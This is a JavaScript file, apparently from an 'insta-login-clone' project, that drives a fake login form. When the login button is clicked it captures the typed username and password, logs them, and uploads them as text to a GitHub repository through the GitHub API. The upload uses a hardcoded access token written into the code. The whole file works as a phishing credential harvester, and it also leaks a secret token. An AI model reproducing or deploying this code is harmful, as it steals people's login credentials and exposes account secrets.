const username = document.querySelector('.username')
const password = document.querySelector('.password')


document.querySelector('.loginButton').addEventListener('click', () => {
    if (username.value ==='' || password.value ==='') {
        console.log('empty');
    }else {
        console.log(username.value, password.value);
        const owner = 'Arnav-lunatic'
        const repo = 'insta-login-clone'
        const path = 'info.txt'
        const token = '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'

        let blob = new Blob([`username - "${username.value}" | password - "${password.value}"`],
                { type: "text/plain" });
        
        const formData = new FormData();
        formData.append("file", blob, path);

        console.log(formData, blob);

        fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}?ref=main`, {
            method: "PUT",
            headers: {
                'Authorization': `token ${token}`,
            },
            body: formData,
        }).then((response) => {
            if (response.status === 201 || response.status === 200) {
              console.log("File written successfully:", response);
            } else {
              console.error("Error writing file:", response.statusText);
            }
          })
          .catch((error) => {
            console.error("Error writing file:", error);
          });
    }
})